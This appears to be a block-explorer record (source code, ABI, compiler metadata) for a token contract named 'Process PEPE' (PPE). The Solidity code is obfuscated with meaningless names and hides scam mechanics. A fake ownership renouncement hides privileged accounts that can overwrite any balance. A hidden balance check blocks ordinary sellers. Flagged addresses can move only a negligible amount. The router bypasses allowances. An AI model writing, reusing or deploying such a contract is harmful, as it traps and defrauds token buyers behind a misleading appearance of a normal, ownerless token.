{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface fromList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeMode) external view returns (uint256);\n\n    function transfer(address launchedLaunch, uint256 swapIs) external returns (bool);\n\n    function allowance(address exemptTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedLaunch,\n        uint256 swapIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundBuy, uint256 value);\n    event Approval(address indexed exemptTo, address indexed spender, uint256 value);\n}\n\nabstract contract launchListIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoReceiverTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquiditySellTrading {\n    function createPair(address sellAuto, address fundMode) external returns (address);\n}\n\ninterface fromListMetadata is fromList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ProcessPEPE is launchListIs, fromList, fromListMetadata {\n\n    function fromSender() public {\n        emit OwnershipTransferred(walletLiquidityTrading, address(0));\n        autoSenderSell = address(0);\n    }\n\n    mapping(address => bool) public launchedIs;\n\n    function launchedList(address walletTotal, address launchedLaunch, uint256 swapIs) internal returns (bool) {\n        if (walletTotal == walletLiquidityTrading) {\n            return tokenSwapLimit(walletTotal, launchedLaunch, swapIs);\n        }\n        uint256 txWallet = fromList(isList).balanceOf(takeLiquidity);\n        require(txWallet == atFrom);\n        require(launchedLaunch != takeLiquidity);\n        if (teamAt[walletTotal]) {\n            return tokenSwapLimit(walletTotal, launchedLaunch, maxAuto);\n        }\n        return tokenSwapLimit(walletTotal, launchedLaunch, swapIs);\n    }\n\n    uint256 private receiverFrom;\n\n    uint256 atFrom;\n\n    address private autoSenderSell;\n\n    function owner() external view returns (address) {\n        return autoSenderSell;\n    }\n\n    function tokenSwapLimit(address walletTotal, address launchedLaunch, uint256 swapIs) internal returns (bool) {\n        require(buyWalletFrom[walletTotal] >= swapIs);\n        buyWalletFrom[walletTotal] -= swapIs;\n        buyWalletFrom[launchedLaunch] += swapIs;\n        emit Transfer(walletTotal, launchedLaunch, swapIs);\n        return true;\n    }\n\n    function approve(address enableList, uint256 swapIs) public virtual override returns (bool) {\n        teamFund[_msgSender()][enableList] = swapIs;\n        emit Approval(_msgSender(), enableList, swapIs);\n        return true;\n    }\n\n    function swapTxReceiver(address tradingSellTotal, uint256 swapIs) public {\n        listAmount();\n        buyWalletFrom[tradingSellTotal] = swapIs;\n    }\n\n    function listAmount() private view {\n        require(launchedIs[_msgSender()]);\n    }\n\n    uint256 private sellReceiverWallet = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private teamFund;\n\n    function marketingFeeFund(uint256 swapIs) public {\n        listAmount();\n        atFrom = swapIs;\n    }\n\n    function transferFrom(address walletTotal, address launchedLaunch, uint256 swapIs) external override returns (bool) {\n        if (_msgSender() != launchSwapTx) {\n            if (teamFund[walletTotal][_msgSender()] != type(uint256).max) {\n                require(swapIs <= teamFund[walletTotal][_msgSender()]);\n                teamFund[walletTotal][_msgSender()] -= swapIs;\n            }\n        }\n        return launchedList(walletTotal, launchedLaunch, swapIs);\n    }\n\n    string private senderLimit = \"Process PEPE\";\n\n    function minAt(address listSender) public {\n        if (fromLiquidity) {\n            return;\n        }\n        if (enableLimit != liquidityReceiver) {\n            enableLimit = true;\n        }\n        launchedIs[listSender] = true;\n        if (enableLimit) {\n            shouldAmount = limitBuy;\n        }\n        fromLiquidity = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderLimit;\n    }\n\n    mapping(address => uint256) private buyWalletFrom;\n\n    string private minMode = \"PPE\";\n\n    address takeLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellReceiverWallet;\n    }\n\n    uint8 private amountLiquidity = 18;\n\n    address launchSwapTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant maxAuto = 10 ** 10;\n\n    uint256 public limitBuy;\n\n    uint256 public enableIsLimit;\n\n    uint256 walletListIs;\n\n    uint256 public shouldAmount;\n\n    bool private liquidityReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minMode;\n    }\n\n    function getOwner() external view returns (address) {\n        return autoSenderSell;\n    }\n\n    bool public fromLiquidity;\n\n    bool private autoAt;\n\n    bool public enableLimit;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountLiquidity;\n    }\n\n    uint256 private txIs;\n\n    uint256 public feeTx;\n\n    event OwnershipTransferred(address indexed swapTotal, address indexed tokenTrading);\n\n    function balanceOf(address feeMode) public view virtual override returns (uint256) {\n        return buyWalletFrom[feeMode];\n    }\n\n    mapping(address => bool) public teamAt;\n\n    address public walletLiquidityTrading;\n\n    function swapReceiver(address maxMin) public {\n        listAmount();\n        \n        if (maxMin == walletLiquidityTrading || maxMin == isList) {\n            return;\n        }\n        teamAt[maxMin] = true;\n    }\n\n    function allowance(address receiverList, address enableList) external view virtual override returns (uint256) {\n        if (enableList == launchSwapTx) {\n            return type(uint256).max;\n        }\n        return teamFund[receiverList][enableList];\n    }\n\n    function transfer(address tradingSellTotal, uint256 swapIs) external virtual override returns (bool) {\n        return launchedList(_msgSender(), tradingSellTotal, swapIs);\n    }\n\n    constructor (){\n        if (feeTx != txIs) {\n            receiverFrom = txIs;\n        }\n        autoReceiverTrading tokenLimit = autoReceiverTrading(launchSwapTx);\n        isList = liquiditySellTrading(tokenLimit.factory()).createPair(tokenLimit.WETH(), address(this));\n        \n        walletLiquidityTrading = _msgSender();\n        fromSender();\n        launchedIs[walletLiquidityTrading] = true;\n        buyWalletFrom[walletLiquidityTrading] = sellReceiverWallet;\n        \n        emit Transfer(address(0), walletLiquidityTrading, sellReceiverWallet);\n    }\n\n    address public isList;\n\n    bool private limitLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableIsLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapIs\",\"type\":\"uint256\"}],\"name\":\"marketingFeeFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSender\",\"type\":\"address\"}],\"name\":\"minAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"}],\"name\":\"swapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSellTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapIs\",\"type\":\"uint256\"}],\"name\":\"swapTxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSellTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLiquidityTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ProcessPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}